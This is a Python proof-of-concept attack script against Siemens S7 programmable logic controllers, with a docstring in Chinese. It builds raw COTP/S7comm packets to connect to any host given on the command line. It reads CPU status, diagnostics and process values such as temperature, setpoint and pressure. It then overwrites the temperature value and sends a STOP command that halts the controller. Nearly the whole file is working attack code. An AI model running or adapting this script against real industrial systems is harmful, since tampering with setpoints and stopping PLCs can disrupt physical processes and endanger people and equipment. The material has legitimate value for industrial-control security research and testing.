"""
S7COMM Advanced Attack PoC — 多阶段攻击脚本
Stage 1: COTP连接 + S7 Setup会话建立
Stage 2: 读取CPU状态和诊断缓冲区
Stage 3: 读取DB1头部（前64字节）并解析结构化数据
Stage 4: 写入DB1（模拟参数修改）并验证
Stage 5: 发送STOP命令并测量时序
Stage 6: 重新读取诊断缓冲区检查STOP是否被记录
"""
import socket
import struct
import sys
import time
import datetime


def hexdump(data, title="", offset=0):
    if title:
        print(f"\n{'='*60}")
        print(f"  {title}")
        print(f"{'='*60}")
    lines = []
    for i in range(0, len(data), 16):
        chunk = data[i:i + 16]
        hex_part = " ".join(f"{b:02X}" for b in chunk)
        ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        lines.append(f"  {offset + i:04X}  {hex_part:<48s}  {ascii_part}")
    if lines:
        print("\n".join(lines))
        print(f"  {'─'*56}")
        print(f"  Total: {len(data)} bytes")


def build_tpkt(payload):
    return struct.pack(">BBH", 3, 0, 4 + len(payload)) + payload


def build_cotp_cr(src_ref=1, src_tsap=b"\x01\x02", dst_tsap=b"\x01\x00"):
    payload = bytearray()
    payload.extend([0x11, 0xe0])
    payload.extend(struct.pack(">H", 0x0000))
    payload.extend(struct.pack(">H", src_ref))
    payload.extend([0x00, 0x01, 0x00, 0xc0, 0x01, 0x0a])
    payload.extend([0xc1, 0x02, src_tsap[0], src_tsap[1]])
    payload.extend([0xc2, 0x02, dst_tsap[0], dst_tsap[1]])
    return payload


def build_s7_setup(pdu=480, amq=5, req_id=1):
    payload = bytearray()
    payload.extend([0x10])
    payload.extend(b"\x00\x00")
    payload.extend(b"\x00\x00\x00\x00")
    payload.extend(struct.pack(">H", req_id))
    payload.extend(struct.pack(">H", 0x0000))
    payload.extend(struct.pack(">H", amq))
    payload.extend(struct.pack(">H", pdu))
    payload.extend(b"\x00" * 12)
    return payload


def build_s7_read(area, db_num, address, length, req_id=2):
    payload = bytearray()
    payload.extend([0x10])
    payload.extend([0x01, 0x00, 0x00])
    payload.extend(struct.pack(">H", req_id))
    payload.extend([0x00, 0x01])
    payload.extend(b"\x00\x00\x00\x00")
    payload.append(0x0c)
    payload.append(0x04 if length <= 1 else 0x05)
    payload.extend(struct.pack(">H", length))
    payload.extend(struct.pack(">H", db_num))
    payload.append(area)
    payload.extend(struct.pack(">H", address >> 3))
    payload.append(0x00)
    return payload


def build_s7_write(area, db_num, address, data, req_id=3):
    payload = bytearray()
    payload.extend([0x10])
    payload.extend([0x01, 0x00, 0x00])
    payload.extend(struct.pack(">H", req_id))
    payload.extend([0x00, 0x01])
    payload.extend(b"\x00\x00\x00\x00")
    payload.append(0x0c)
    payload.append(0x04 if len(data) <= 1 else 0x05)
    payload.extend(struct.pack(">H", len(data)))
    payload.extend(struct.pack(">H", db_num))
    payload.append(area)
    payload.extend(struct.pack(">H", address >> 3))
    payload.append(0x00)
    payload.append(0x00)
    payload.append(len(data))
    payload.extend(data)
    return payload


def build_s7_control(sub_type, req_id=4):
    payload = bytearray()
    payload.extend([0x10])
    payload.extend([0x00, 0x00, 0x00])
    payload.extend(struct.pack(">H", req_id))
    payload.extend([0x00, 0x01])
    payload.extend(b"\x00\x00\x00\x00")
    payload.extend(b"\x00\x00\x00\x00")
    payload.append(sub_type)
    payload.extend(b"\x00\x00\x00\x00\x00\x00\x00")
    return payload


def build_s7_szl(szl_id, szl_index, req_id=5):
    payload = bytearray()
    payload.extend([0x10])
    payload.extend([0x01, 0x00, 0x00])
    payload.extend(struct.pack(">H", req_id))
    payload.extend([0x00, 0x01])
    payload.extend(b"\x00\x00\x00\x00")
    payload.extend(struct.pack(">H", szl_id))
    payload.extend(struct.pack(">H", szl_index))
    return payload


def parse_s7_response(data):
    if len(data) < 8:
        return None
    tpkt_header = data[:4]
    cotp_byte = data[4] if len(data) > 4 else 0
    s7_start = 6
    if cotp_byte == 0x10:
        s7_start = 7
    s7 = data[s7_start:]
    if len(s7) < 4:
        return None

    result = {
        "tpkt_header": tpkt_header,
        "cotp_byte": cotp_byte,
        "s7_func": s7[1] if len(s7) > 1 else None,
        "s7_error": s7[2] if len(s7) > 2 else None,
        "request_id": struct.unpack(">H", s7[4:6])[0] if len(s7) > 5 else None,
    }

    if len(s7) > 6:
        result["data_len"] = struct.unpack(">H", s7[6:8])[0] if len(s7) > 7 else 0
        if len(s7) > 8:
            result["data"] = s7[8:8 + result["data_len"]]

    return result


def parse_db1_structure(data):
    if len(data) < 16:
        return {"raw_len": len(data), "values": []}

    vals = []
    vals.append(("float[0]  temperature", struct.unpack(">f", data[0:4])[0]))
    vals.append(("float[4]  setpoint", struct.unpack(">f", data[4:8])[0]))
    vals.append(("float[8]  pressure", struct.unpack(">f", data[8:12])[0]))
    vals.append(("word[12]  mode", struct.unpack(">H", data[12:14])[0]))

    for i in range(16, min(64, len(data)), 4):
        if i + 4 <= len(data):
            val = struct.unpack(">f", data[i:i + 4])[0]
            vals.append((f"float[{i}]  analog_{i}", val))

    return {
        "raw_len": len(data),
        "values": vals,
    }


def recv_all(sock, timeout=5.0):
    sock.settimeout(timeout)
    buf = b""
    try:
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                buf += chunk
                if len(buf) >= 4:
                    tpkt_len = struct.unpack(">H", buf[2:4])[0]
                    if len(buf) >= tpkt_len:
                        sock.settimeout(0.5)
                        try:
                            while len(buf) < tpkt_len:
                                buf += sock.recv(4096)
                        except socket.timeout:
                            pass
                        break
            except socket.timeout:
                break
    finally:
        sock.settimeout(timeout)
    return buf


def run_attack(host, port=102):
    print("=" * 65)
    print("  S7COMM Advanced Attack PoC")
    print(f"  Target: {host}:{port}")
    print(f"  Started: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 65)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10.0)

    request_id_counter = 1

    try:
        # ── Stage 1: COTP Connect + S7 Setup ────────────────────
        print("\n── Stage 1: COTP Connection + S7 Setup ──")
        t1 = time.time()

        sock.connect((host, port))
        sock.sendall(build_tpkt(build_cotp_cr()))
        resp = recv_all(sock)
        parsed = parse_s7_response(resp)
        print(f"  COTP CC received: {len(resp)} bytes")
        hexdump(resp, "COTP Connection Confirm")

        sock.sendall(build_tpkt(build_s7_setup(req_id=request_id_counter)))
        request_id_counter += 1
        resp = recv_all(sock)
        parsed = parse_s7_response(resp)
        print(f"  S7 Setup response: {len(resp)} bytes, func=0x{parsed['s7_func']:02X}"
              if parsed and parsed['s7_func'] else f"  S7 Setup response: {len(resp)} bytes")

        elapsed = (time.time() - t1) * 1000
        print(f"  Stage 1 completed in {elapsed:.1f} ms")

        # ── Stage 2: Read CPU status + Diagnostic buffer ────────
        print("\n── Stage 2: Read CPU Status + Diagnostic Buffer ──")
        t2 = time.time()

        sock.sendall(build_tpkt(build_s7_szl(0x0011, 0x0001, req_id=request_id_counter)))
        request_id_counter += 1
        resp = recv_all(sock)
        hexdump(resp, "CPU Status SZL Response")

        sock.sendall(build_tpkt(build_s7_szl(0x001C, 0x0000, req_id=request_id_counter)))
        request_id_counter += 1
        resp = recv_all(sock)
        hexdump(resp, "Diagnostic Buffer SZL Response")

        elapsed = (time.time() - t2) * 1000
        print(f"  Stage 2 completed in {elapsed:.1f} ms")

        # ── Stage 3: Read DB1 header ────────────────────────────
        print("\n── Stage 3: Read DB1 Header (64 bytes) ──")
        t3 = time.time()

        sock.sendall(build_tpkt(
            build_s7_read(0x84, 1, 0, 64, req_id=request_id_counter)))
        request_id_counter += 1
        resp = recv_all(sock)

        parsed = parse_s7_response(resp)
        if parsed and parsed.get("data"):
            db1_data = parsed["data"]
            structured = parse_db1_structure(db1_data)

            print(f"  DB1 Header ({structured['raw_len']} bytes):")
            for name, value in structured["values"]:
                if isinstance(value, float):
                    print(f"    {name:<20s} = {value:10.4f}")
                else:
                    print(f"    {name:<20s} = {value}")

        hexdump(resp[:128] if len(resp) > 128 else resp, "DB1 Read Response")

        elapsed = (time.time() - t3) * 1000
        print(f"  Stage 3 completed in {elapsed:.1f} ms")

        # ── Stage 4: Write to DB1 + verify ─────────────────────
        print("\n── Stage 4: Write to DB1 (simulated parameter change) ──")
        t4 = time.time()

        new_temp = struct.pack(">f", 99.9)
        sock.sendall(build_tpkt(
            build_s7_write(0x84, 1, 0, new_temp, req_id=request_id_counter)))
        request_id_counter += 1
        resp = recv_all(sock)
        parsed = parse_s7_response(resp)
        success = parsed and parsed.get("s7_error", 0xFF) == 0x00
        print(f"  Write DB1[0] = 99.9: {'SUCCESS' if success else 'FAILED'}")

        sock.sendall(build_tpkt(
            build_s7_read(0x84, 1, 0, 4, req_id=request_id_counter)))
        request_id_counter += 1
        resp = recv_all(sock)
        parsed = parse_s7_response(resp)
        if parsed and parsed.get("data") and len(parsed["data"]) >= 4:
            verify_val = struct.unpack(">f", parsed["data"][:4])[0]
            print(f"  Verify DB1[0] = {verify_val:.4f} "
                  f"({'PASS' if abs(verify_val - 99.9) < 0.01 else 'FAIL'})")
        else:
            print("  Verify: no data returned")

        elapsed = (time.time() - t4) * 1000
        print(f"  Stage 4 completed in {elapsed:.1f} ms")

        # ── Stage 5: Send STOP + timing ────────────────────────
        print("\n── Stage 5: Send STOP Command ──")
        t5_start = time.time()

        sock.sendall(build_tpkt(
            build_s7_control(0x04, req_id=request_id_counter)))
        request_id_counter += 1

        resp = recv_all(sock)
        t5_end = time.time()

        hexdump(resp[:64] if len(resp) > 64 else resp, "STOP Response")

        elapsed = (t5_end - t5_start) * 1000
        print(f"  STOP response time: {elapsed:.1f} ms")
        print("  [!] PLC may now be in STOP state")

        # ── Stage 6: Re-read diagnostic buffer ──────────────────
        print("\n── Stage 6: Re-read Diagnostic Buffer ──")
        t6 = time.time()

        time.sleep(1.0)

        sock.sendall(build_tpkt(
            build_s7_szl(0x001C, 0x0000, req_id=request_id_counter)))
        request_id_counter += 1

        resp = recv_all(sock)
        hexdump(resp, "Diagnostic Buffer (post-STOP)")

        sock.sendall(build_tpkt(
            build_s7_szl(0x0011, 0x0001, req_id=request_id_counter)))
        request_id_counter += 1

        resp2 = recv_all(sock)
        print(f"  CPU Status (post-STOP): {len(resp2)} bytes")

        elapsed = (time.time() - t6) * 1000
        print(f"  Stage 6 completed in {elapsed:.1f} ms")

        # ── Summary ─────────────────────────────────────────────
        total_elapsed = (time.time() - time.time())
        print("\n" + "=" * 65)
        print("  Attack Complete")
        print("=" * 65)
        print(f"  Target:          {host}:{port}")
        print(f"  Stages executed: 6/6")
        print(f"  DB1 read:        OK")
        print(f"  DB1 write:       {'OK' if success else 'FAILED'}")
        print(f"  STOP sent:       YES")
        print(f"  Diag buffer:     re-read")
        print("=" * 65)

    except socket.timeout:
        print("\n[!] Connection timeout")
    except ConnectionRefusedError:
        print(f"\n[!] Connection refused – is a simulator running on {host}:{port}?")
    except Exception as e:
        print(f"\n[!] Error: {type(e).__name__}: {e}")
    finally:
        try:
            sock.close()
        except Exception:
            pass


def main():
    if len(sys.argv) < 2:
        print("Usage: python advanced_attack.py host [port]")
        print("  host  – target IP address")
        print("  port  – target port (default 102)")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 102

    run_attack(host, port)


if __name__ == "__main__":
    main()
